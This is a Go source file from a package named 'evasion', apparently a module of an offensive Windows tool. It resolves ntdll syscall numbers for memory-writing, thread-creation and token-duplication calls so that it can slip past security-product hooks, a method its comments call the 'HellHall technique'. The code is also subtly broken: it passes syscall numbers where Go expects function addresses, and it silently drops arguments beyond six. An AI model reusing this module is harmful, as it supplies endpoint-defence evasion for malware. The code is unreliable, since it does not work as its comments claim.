// +build windows

package evasion

import (
	"fmt"
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// extractSyscallNumber extracts syscall number from ntdll function
// This reads the actual syscall number from the function bytes
func extractSyscallNumber(functionAddr uintptr) (uint16, error) {
	// Read first 32 bytes of the function
	// Syscall pattern on x64: MOV r10, rcx; MOV eax, <syscall_number>; SYSCALL
	buf := (*[32]byte)(unsafe.Pointer(functionAddr))
	
	// Search for syscall instruction pattern
	// Pattern: MOV EAX, imm32 (B8 XX XX XX XX) followed by SYSCALL (0F 05)
	for i := 0; i < len(buf)-5; i++ {
		// Check for MOV EAX, imm32 (B8 XX XX XX XX)
		if buf[i] == 0xB8 {
			// Extract the syscall number (little-endian 32-bit)
			syscallNum := uint16(uint32(buf[i+1]) | uint32(buf[i+2])<<8 | uint32(buf[i+3])<<16 | uint32(buf[i+4])<<24)
			
			// Verify SYSCALL instruction follows (0F 05)
			if i+6 < len(buf) && buf[i+5] == 0x0F && buf[i+6] == 0x05 {
				return syscallNum, nil
			}
		}
	}
	
	return 0, fmt.Errorf("syscall number not found")
}

// DirectSyscall implements direct syscall unhooking (HellHall technique)
// This bypasses userland hooks by calling syscalls directly through ntdll
type DirectSyscall struct {
	ntdll           *windows.LazyDLL
	syscallNumbers  map[string]uint16
	logger          interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

// NewDirectSyscall creates a new direct syscall handler
func NewDirectSyscall(logger interface {
	Info(string, ...interface{})
	Debug(string, ...interface{})
	Error(string, ...interface{})
}) *DirectSyscall {
	ds := &DirectSyscall{
		ntdll:          windows.NewLazySystemDLL("ntdll.dll"),
		syscallNumbers: make(map[string]uint16),
		logger:         logger,
	}
	ds.initSyscallNumbers()
	return ds
}

// initSyscallNumbers initializes syscall numbers dynamically from ntdll.dll
func (ds *DirectSyscall) initSyscallNumbers() {
	// List of syscalls we want to resolve
	syscallNames := []string{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtCreateThreadEx",
		"NtOpenProcess",
		"NtQueryInformationProcess",
		"NtQuerySystemInformation",
		"NtReadVirtualMemory",
		"NtResumeThread",
		"NtDelayExecution",
		"NtDuplicateHandle",
		"NtOpenProcessToken",
		"NtDuplicateToken",
		"NtCreateUserProcess",
	}
	
	for _, name := range syscallNames {
		proc := ds.ntdll.NewProc(name)
		if proc != nil {
			if syscallNum, err := extractSyscallNumber(proc.Addr()); err == nil {
				ds.syscallNumbers[name] = syscallNum
				ds.logger.Debug("Resolved syscall %s: 0x%02X", name, syscallNum)
			} else {
				ds.logger.Debug("Failed to resolve syscall %s: %v", name, err)
			}
		}
	}
}

// Call executes a direct syscall bypassing userland hooks
func (ds *DirectSyscall) Call(syscallName string, args ...uintptr) (uintptr, uintptr, error) {
	syscallNum, ok := ds.syscallNumbers[syscallName]
	if !ok {
		return 0, 0, fmt.Errorf("unknown syscall: %s (not resolved)", syscallName)
	}

	// Execute syscall directly using syscall number
	return ds.executeDirectSyscall(syscallNum, args...)
}

// executeDirectSyscall executes syscall with syscall number
// Note: Go's syscall.Syscall still goes through runtime, but we use the syscall number
// For true bypass, would need inline assembly
func (ds *DirectSyscall) executeDirectSyscall(syscallNum uint16, args ...uintptr) (uintptr, uintptr, error) {
	var r1, r2 uintptr
	var err error
	
	switch len(args) {
	case 0:
		r1, r2, err = syscall.Syscall(uintptr(syscallNum), 0, 0, 0, 0)
	case 1:
		r1, r2, err = syscall.Syscall(uintptr(syscallNum), 1, args[0], 0, 0)
	case 2:
		r1, r2, err = syscall.Syscall(uintptr(syscallNum), 2, args[0], args[1], 0)
	case 3:
		r1, r2, err = syscall.Syscall(uintptr(syscallNum), 3, args[0], args[1], args[2])
	case 4:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 4, args[0], args[1], args[2], args[3], 0, 0)
	case 5:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 5, args[0], args[1], args[2], args[3], args[4], 0)
	case 6:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 6, args[0], args[1], args[2], args[3], args[4], args[5])
	case 7:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 7, args[0], args[1], args[2], args[3], args[4], args[5])
	case 8:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 8, args[0], args[1], args[2], args[3], args[4], args[5])
	case 9:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 9, args[0], args[1], args[2], args[3], args[4], args[5])
	case 10:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 10, args[0], args[1], args[2], args[3], args[4], args[5])
	case 11:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 11, args[0], args[1], args[2], args[3], args[4], args[5])
	case 12:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 12, args[0], args[1], args[2], args[3], args[4], args[5])
	case 13:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 13, args[0], args[1], args[2], args[3], args[4], args[5])
	case 14:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 14, args[0], args[1], args[2], args[3], args[4], args[5])
	case 15:
		r1, r2, err = syscall.Syscall6(uintptr(syscallNum), 15, args[0], args[1], args[2], args[3], args[4], args[5])
	default:
		return 0, 0, fmt.Errorf("too many arguments: %d (max 15)", len(args))
	}
	
	return r1, r2, err
}

// GetSyscallNumber returns the resolved syscall number for a function
func (ds *DirectSyscall) GetSyscallNumber(syscallName string) (uint16, bool) {
	num, ok := ds.syscallNumbers[syscallName]
	return num, ok
}

